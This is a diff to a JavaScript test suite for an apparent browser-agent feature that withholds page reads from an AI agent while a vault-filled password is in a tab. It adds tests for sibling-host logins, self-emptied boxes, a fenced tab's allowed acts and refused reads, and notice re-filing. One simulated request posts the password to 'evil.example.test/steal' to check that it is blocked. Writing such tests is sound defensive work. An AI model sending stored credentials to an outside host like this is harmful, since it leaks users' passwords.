@@ -56,6 +56,7 @@ const scrubbedOk = (ok) => (c, label, detail) => ok(c, scrubText(label), detail 
 export function expectedVerdictAfterUnlock(cell) {
   if (cell.fence === 'none' && !cell.guards) return { status: 200, code: null, flavor: 'allow', readableAtMovedUrl: false };
   if (cell.fence === 'unknown') return { status: 409, code: 'login_fill_live', flavor: 'entry_gone', readableAtMovedUrl: false };
+  if (cell.fence === 'live') return { status: 409, code: 'login_fill_live', flavor: 'live', readableAtMovedUrl: false };   // (主开发's L4 looks in the fill's own isolated world — a restart has none: the revived live fill holds)
   return expectedVerdictForCell({ ...cell, check: 'mem', conn: 'connected' });
 }
 export function expectedVerdictForCell({ fence, guards, check, page, url, conn }) {
@@ -74,7 +75,15 @@ export function expectedVerdictForCell({ fence, guards, check, page, url, conn }
     return { status: 200, code: null, flavor: 'allow', readableAtMovedUrl };
   }
   // Law S2: Same-process reconnect restores RAM stash to the same browser, obeying identical in-memory laws as `connected`.
-  if (fence === 'live') return { status: 409, code: 'login_fill_live', flavor: 'live', readableAtMovedUrl: false };
+  // 主开发's L4 (2026-11-15 09:16Z): A LIVE FILL ENDS WHEN ITS BOX NO LONGER HOLDS THE SECRET — at a read the hub looks at the filled box
+  // in the fill's own isolated world, which lives only on the connection that filled (after a reconnect it cannot look: held). The
+  // table's «clean» page has no value in any box ⇒ the look lifts, the lift leaves its guard, and the guard decides the read
+  if (fence === 'live') {
+    if (conn !== 'connected') return { status: 409, code: 'login_fill_live', flavor: 'live', readableAtMovedUrl: false };
+    if (page === 'putback') return { status: 409, code: 'login_fill_live', flavor: 'live', readableAtMovedUrl: false };   // (the box still holds it: no lift)
+    if (check === 'throw') return { status: 409, code: 'login_check_failed', flavor: 'check_failed', readableAtMovedUrl: false };   // (lifted; the guard the lift leaves cannot look)
+    return { status: 200, code: null, flavor: 'allow', readableAtMovedUrl: false };
+  }
   if (fence === 'unknown') return { status: 409, code: 'login_fill_live', flavor: 'until_nav', readableAtMovedUrl: false };
   // Law 1: Guard retirement is NOT a check — `postLiftHeld` stays `until_nav` when activeGuards === 0.
   if (activeGuards === 0) {
@@ -285,7 +294,7 @@ async function openCdpClient(WebSocket, wsUrl) {
 }
 
 const TWO_DOORS_RE = /reload or navigate this tab[\s\S]*open or switch to another tab/i;
-const AWAIT_VAULT_RE = /checks this tab again once the vault is unlocked[\s\S]*open or switch to another tab/i;   // (lane chrome-157, amendment 1: the one sentence of a restored hold)
+const AWAIT_VAULT_RE = /^(?=[\s\S]*checks this tab again once the vault is unlocked)(?=[\s\S]*open or switch to another tab)/i;   // (lane chrome-157, amendment 1: the one sentence of a restored hold)
 const ENTRY_GONE_RE = /no longer in the vault[\s\S]*open or switch to another tab/i;   // (…and of one whose entry is gone)
 const CROSS_ORIGIN_RE = /cross-origin requests from this page are blocked/i;
 
@@ -1437,7 +1446,8 @@ export async function runR32LoginTable({ repoDir, ok: okRaw }) {
         request: { url: 'https://cdn.other-origin.example.test/api.json', method: 'GET', headers: {} },
       });
       await sleep(30);
-      const blockedBeforeReload = fetchActions.some((a) => a.method === 'Fetch.failRequest' && a.params?.requestId === 'req-xorig-1' && a.params?.errorReason === 'BlockedByClient');
+      // (主开发's L2, 2026-11-15: a fence with no values blocks nothing it cannot match — the held tab's page loads from other hosts)
+      const loadsBeforeReload = fetchActions.some((a) => a.method === 'Fetch.continueRequest' && a.params?.requestId === 'req-xorig-1') && !fetchActions.some((a) => a.method === 'Fetch.failRequest' && a.params?.requestId === 'req-xorig-1');
 
       // Door 2: `tab new` and `tab 1` allowed (`200`) even when active tab `tid1` is fenced; reading `tid2` works (`200`) while `tid1` stays fenced (`409`)
       const rTabNew = await post('/api/agent/browser/resolve', { profile: PID, handle: PID, wrapper: true, fenceCheckOnly: true, argv: ['tab', 'new', `${ORIGIN}/home`], targetId: tid1 });
@@ -1457,14 +1467,14 @@ export async function runR32LoginTable({ repoDir, ok: okRaw }) {
       const medTab1AfterReload = await medWs.readPw(tid1);
 
       ok(
-        blockedBeforeReload
+        loadsBeforeReload
           && rTabNew.status === 200 && rTabSwitch.status === 200
           && rReadTab2.status === 200 && medTab2.ok === true
           && rReadTab1StillFenced.status === 409
           && rReload.status === 200
           && rReadTab1AfterReload.status === 409 && AWAIT_VAULT_RE.test(String(rReadTab1AfterReload.json?.error || '')) && medTab1AfterReload.ok === false,
-        'R32-Doors (Both exit doors & cross-origin block): a restored tab blocks cross-origin requests, Door 2 (`tab new` / `tab` + other tab read) works while the tab stays fenced, and after a cold restart a reload (Door 1) does NOT lift it before the vault is back — its sentence names the vault and the other tab',
-        { blockedBeforeReload, rTabNew: rTabNew.status, rTabSwitch: rTabSwitch.status, rReadTab2: rReadTab2.status, medTab2, rReadTab1StillFenced: rReadTab1StillFenced.status, rReload: rReload.status, rReadTab1AfterReload: rReadTab1AfterReload.status, medTab1AfterReload },
+        'R32-Doors (Both exit doors; L2): a restored tab with no values in memory blocks nothing it cannot match — its page loads from other hosts; Door 2 (`tab new` / `tab` + other tab read) works while the tab stays fenced, and after a cold restart a reload (Door 1) does NOT lift it before the vault is back — its sentence names the vault and the other tab',
+        { loadsBeforeReload, rTabNew: rTabNew.status, rTabSwitch: rTabSwitch.status, rReadTab2: rReadTab2.status, medTab2, rReadTab1StillFenced: rReadTab1StillFenced.status, rReload: rReload.status, rReadTab1AfterReload: rReadTab1AfterReload.status, medTab1AfterReload },
       );
     } finally {
       medWs.close();
@@ -1974,7 +1984,8 @@ const HOLD_AFTERS = ['still', 'reload', 'other', 'closed'];
 const HOLD_NOTICE_KINDS = new Set(['value_shown', 'too_much_text', 'unknown_typed']);   // (the kinds whose producer files the owner's notice)
 const WORDS_RE = {
   live: /in progress or unsubmitted/, shown: /own address or title/, too_much: /too much text/, unknown: /can no longer verify/,
-  await: /checks this tab again once the vault is unlocked[\s\S]*open or switch to another tab/, entry_gone: /no longer in the vault[\s\S]*open or switch to another tab/,
+  await: /open or switch to another tab: VibeSpace restarted[\s\S]*checks this tab again once the vault is unlocked/,   // (主开发's L2: the way out first)
+  entry_gone: /no longer in the vault[\s\S]*open or switch to another tab/,
 };
 const valueSpellings = (pw) => [...new Set([pw, encodeURIComponent(pw), new URLSearchParams([['a', pw]]).toString().slice(2), b64State(pw)])];
 
@@ -2172,6 +2183,26 @@ async function cureNotices(mods) {
       out[how] = { ok: openBefore && !openAfter, openBefore, openAfter };
     } finally { await s.close(); }
   }
+  {   // (主开发 2026-11-15 item 3, the look's F6): A NOTICE THE OWNER MARKED DONE IS NOT RAISED AGAIN BY A RESTART — the hub files a hold's
+      // notice once, when the hold begins; a restart or a reconnect never files it again (the store would reopen a done item)
+    const s = await cureScene(mods, 'cndn', 'bk-0000c0b3');
+    try {
+      const h = await s.start({ fresh: true });
+      await s.fill(h);
+      await s.nav(`${s.ORIGIN}/welcome?pw=${encodeURIComponent(CURE_PW)}`);
+      const filed = s.notices.find((n) => /own address or title/.test(n.text) && !n.resolved);
+      if (filed) filed.resolved = true;   // (the owner's «done»)
+      const raisesDone = s.tray.raises;
+      await s.stop(h);
+      s.clk.t += 2000;
+      const h2 = await s.start();
+      await h2.dialogs.arm(s.pid); s.bind(h2); await sleep(120);
+      await h2.vault.unlock(CURE_VPW);
+      await sleep(400);
+      const stillHeld = !h2.dialogs.liveFillVerdictFor({ profileId: s.pid, browserKey: s.KEY }, { verb: 'eval', argv: ['eval', '1'], targetId: s.tid }).ok;
+      out.doneStaysDone = { ok: Boolean(filed) && stillHeld && s.tray.raises === raisesDone && !s.notices.some((n) => !n.resolved), filed: Boolean(filed), stillHeld, raised: s.tray.raises - raisesDone };
+    } finally { await s.close(); }
+  }
   {   // (the store's own rule, through the browser wiring's arguments)
     const { UserTodoManager } = mods.req('./src/user-todos.js');
     const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'vs-r32-tray-'));
@@ -2185,6 +2216,83 @@ async function cureNotices(mods) {
       out.refile = { ok: a.id === b.id && changes === c1 && JSON.stringify(m.get(a.id)) === snap1, sameId: a.id === b.id, raised: changes - c1 };
       try { m.stop(); } catch { /* */ }
     } finally { fs.rmSync(dir, { recursive: true, force: true }); }
+  }
+  return { ok: Object.values(out).every((x) => x.ok), ...out };
+}
+
+/** 主开发's loosenings of 2026-11-15 09:16Z and the owner's two questions — each row says an ORDINARY LOGIN FINISHES (or an ordinary read
+ *  works), driven through both doors: L1 a form posting to a sibling host of the same site (Chrome's own registrable domain); L4 a
+ *  box the page empties by itself, with no request the hub can recognise; L3 the listing and the agent's own tab close on a fenced
+ *  tab; a user name filled from the vault closes nothing; a next step rendered in the same document after the submit is read. */
+async function cureOrdinary(mods) {
+  const out = {};
+  const settle = async (s, h, t, want, ms = 1200) => { const end = Date.now() + ms; let r; do { r = await s.read(h, t); if (r.status === want) return r; await sleep(40); } while (Date.now() < end); return r; };
+  {   // L1: the credential goes to auth.<site> — the request continues, its answer is the submit, the tab lifts; a foreign host is still blocked
+    const s = await cureScene(mods, 'cnsib', 'bk-0000c0b5');
+    try {
+      const h = await s.start({ fresh: true });
+      s.fk.setSite(s.tid, 'cnsib.example.test');   // (as Chrome names the registrable domain of https://cnsib.example.test/login)
+      const f = await s.fill(h);
+      const foreign = await s.fk.simulateSubmitRequest({ targetId: s.tid, url: 'https://evil.example.test/steal', postData: `pw=${encodeURIComponent(CURE_PW)}`, resourceType: 'Fetch' });
+      const sib = await s.fk.simulateSubmitRequest({ targetId: s.tid, url: 'https://auth.cnsib.example.test/session', postData: `pw=${encodeURIComponent(CURE_PW)}`, resourceType: 'Fetch', finish: true });
+      const r = await settle(s, h, s.tid, 200);
+      const m = await s.medRead(h);
+      out.siblingHost = { ok: f.status === 200 && foreign.action === 'fail' && sib.action !== 'fail' && r.status === 200 && m.ok === true, fill: f.status, foreign: foreign.action, sibling: sib.action, read: r.status, med: m.ok };
+    } finally { await s.close(); }
+  }
+  {   // L4: the page empties the filled box by itself (it hashed the password and sent it in a way the hub cannot recognise) — the next read lifts at once
+    const s = await cureScene(mods, 'cnbox', 'bk-0000c0b6');
+    try {
+      const h = await s.start({ fresh: true });
+      const f = await s.fill(h);
+      const held = await s.read(h);
+      await s.raw.writePw(s.tid, '');   // (the page empties the same box itself — its own script, no request the hub can recognise)
+      const t0 = Date.now();
+      const r = await s.read(h);
+      const ms = Date.now() - t0;
+      const m = await s.medRead(h);
+      out.boxEmptied = { ok: f.status === 200 && held.status === 409 && r.status === 200 && m.ok === true, held: held.status, read: r.status, med: m.ok, ms };
+    } finally { await s.close(); }
+  }
+  {   // the user name first (the owner's question): a user name filled from the vault closes nothing — reads work; the password closes the tab
+    const s = await cureScene(mods, 'cnusr', 'bk-0000c0b7');
+    try {
+      const h = await s.start({ fresh: true });
+      s.fk.setDom(s.tid, { url: s.U0, newDocument: false, elements: [{ id: 'user', tag: 'input', type: 'text', name: 'Username' }] });
+      await h.dialogs.arm(s.pid); s.bind(h);
+      const fu = await h.post('/api/agent/browser/fill-vault', { profile: s.pid, target: '#user', spec: 'cnusr.example.test#dana/user', targetId: s.tid });
+      const readAfterUser = await h.post('/api/agent/browser/resolve', { profile: s.pid, handle: s.pid, wrapper: true, fenceCheckOnly: true, argv: ['snapshot', '-i'], targetId: s.tid });
+      s.fk.setDom(s.tid, { url: s.U0, newDocument: false, elements: [{ id: 'user', tag: 'input', type: 'text', name: 'Username' }, PW_EL] });   // (Next was pressed: the page shows the password box)
+      const fp = await s.fill(h);
+      const readAfterPw = await s.read(h);
+      out.userNameFirst = { ok: fu.status === 200 && readAfterUser.status === 200 && fp.status === 200 && readAfterPw.status === 409, user: fu.status, readAfterUser: readAfterUser.status, password: fp.status, readAfterPw: readAfterPw.status };
+    } finally { await s.close(); }
+  }
+  {   // a two-step login in ONE document: the password's same-origin submit answers, the page renders its code box in the same document — read
+    const s = await cureScene(mods, 'cn2st', 'bk-0000c0b8');
+    try {
+      const h = await s.start({ fresh: true });
+      await s.fill(h);
+      await s.fk.simulateSubmitRequest({ targetId: s.tid, url: `${s.ORIGIN}/api/session`, postData: `pw=${encodeURIComponent(CURE_PW)}`, resourceType: 'Fetch', finish: true });
+      const r1 = await settle(s, h, s.tid, 200);
+      s.fk.setDom(s.tid, { url: s.U0, newDocument: false, elements: [{ id: 'code', tag: 'input', type: 'text', name: 'Code' }] });
+      const r2 = await h.post('/api/agent/browser/resolve', { profile: s.pid, handle: s.pid, wrapper: true, fenceCheckOnly: true, argv: ['snapshot', '-i'], targetId: s.tid });
+      out.twoStepOneDocument = { ok: r1.status === 200 && r2.status === 200, afterSubmit: r1.status, readStep: r2.status };
+    } finally { await s.close(); }
+  }
+  {   // L3 + what an agent CAN do on a fenced tab (主开发's item 2, said in one place): the acts pass, the reads are refused
+    const s = await cureScene(mods, 'cnact', 'bk-0000c0b9');
+    try {
+      const h = await s.start({ fresh: true });
+      await s.fill(h);
+      const ask = (argv) => h.post('/api/agent/browser/resolve', { profile: s.pid, handle: s.pid, wrapper: true, fenceCheckOnly: true, argv, targetId: s.tid }).then((r) => r.status);
+      const acts = { click: ['click', '@e1'], press: ['press', 'Enter'], fill: ['fill', '#pw', 'x'], wait: ['wait', '500'], open: ['open', `${s.ORIGIN}/home`], reload: ['reload'], tabNew: ['tab', 'new', `${s.ORIGIN}/home`], tabSwitch: ['tab', '1'], tabList: ['tab', 'list'], tabBare: ['tab'], tabClose: ['tab', 'close'] };
+      const reads = { snapshot: ['snapshot', '-i'], get: ['get', 'value', '#pw'], eval: ['eval', '1'], screenshot: ['screenshot'], waitFn: ['wait', '--fn', '1'] };
+      const actA = {}, readA = {};
+      for (const [k, a] of Object.entries(acts)) actA[k] = await ask(a);
+      for (const [k, a] of Object.entries(reads)) readA[k] = await ask(a);
+      out.closedTabActs = { ok: Object.values(actA).every((x) => x === 200) && Object.values(readA).every((x) => x === 409), acts: actA, reads: readA };
+    } finally { await s.close(); }
   }
   return { ok: Object.values(out).every((x) => x.ok), ...out };
 }
@@ -2214,6 +2322,7 @@ function cureCheckRows(BLx) {
 }
 
 const CURE_LEGS = {
+  ordinary: { fn: cureOrdinary, label: () => 'R32-ORDINARY (主开发 2026-11-15: an ordinary login FINISHES): L1 a form posting to a sibling host of the same site (Chrome\'s own registrable domain) lifts at its answer, a foreign host still blocked; L4 a box the page empties by itself lifts at the next read; a user name filled from the vault closes nothing; a next step rendered in the same document after the submit is read; L3 + item 2 — on a fenced tab every act passes (click, press, fill, wait, open, reload, every `tab` form incl. the listing and close) and every read is refused' },
   bound: { fn: cureBound, label: (r) => `R32-BOUND (item 7: a check that keeps failing has a bound): a put-back value whose check never answers is «try again» ${r.firstHold} times, then held until it navigates with both doors named (on both doors); a new document ends it` },
   notices: { fn: cureNotices, label: () => 'R32-NOTICES (S1 + amendment 3): the owner\'s notice of a hold ends with it when the browser stops and when the profile is deleted — by its key, a past hub life\'s too — and the For-you store raises nothing when a notice is re-filed under its key' },
   next: { fn: cureNext, label: (r) => `R32-NEXT (items 1+2, the one check): a GET form and a base64 router carry the typed value into the next address by themselves — the tab stays fenced and both doors say why, the owner is told once, the ${r.navEvents} navigation events the agent's own session got carry it in none of its forms; the clean next page lifts it and the notice goes` },
@@ -2453,9 +2562,9 @@ export async function runR32Mutants({ repoDir, ok: okRaw, MUT }) {
   await holdsMutant('RENEWAL (the document id not renewed at a top-frame navigation — P1)',
     once(bdSrc, "e.docId = String(p.frame.loaderId || '') || ('nav:' + (++docSeq));", "/* MUTANT RENEWAL */"),
     'r32-holds-no-renewal', { words: ['live'], conns: ['cold'] }, (r) => r.red > 0 && r.redCells.some((x) => x.cell.doc === 'known' && x.cell.phase === 2));
-  await holdsMutant('REFILE (a notice re-filed at a restart without its key raises again — amendment 3)',
-    once(bdSrc, "i18n: { text: i18nText, detail: i18nDetail }, itemKey: holdKeyOf(w.profileId, (e && e.targetId) || lf.targetId) }) || null;\n    } catch { /* optional */ }\n  }\n  function fileCeilingWipeNotice", "i18n: { text: i18nText, detail: i18nDetail } }) || null;   /* MUTANT REFILE */\n    } catch { /* optional */ }\n  }\n  function fileCeilingWipeNotice"),
-    'r32-holds-refile-raises', { words: ['value_shown'], conns: ['cold'] }, (r) => r.red > 0 && r.redCells.some((x) => x.detail && x.detail.raisesAfterRestart > x.detail.raisesBefore));
+  await cureMutant('REFILE (a restart files the hold\'s notice again — a notice the owner marked done is raised again; F6)', 'src/server/browser-dialogs.js',
+    once(bdSrc, "      if (f.hold === 'value_shown' && e.liveFill) e.liveFill.valueShownNoticed = true;", "      if (f.hold === 'value_shown') fileValueShownNotice(w, e, e.liveFill);   /* MUTANT REFILE */"), 'r32-cure-refile', 'notices',
+    (r) => r.ok === false && r.doneStaysDone && r.doneStaysDone.raised > 0);
   await cureMutant('VAULT-LIST (the re-hydration also lists the vault — P3)', 'src/server/browser-dialogs.js',
     once(bdSrc, "    const missing = new Set();\n    for (const s of [...names]) {", "    const missing = new Set();\n    try { if (logins && typeof logins.list === 'function') logins.list(); } catch { /* */ }   /* MUTANT VAULT-LIST */\n    for (const s of [...names]) {"),
     'r32-cure-vault-list', 'vaultReads', (r) => r.ok === false && Array.isArray(r.outside) && r.outside.includes('list@hydrate'));
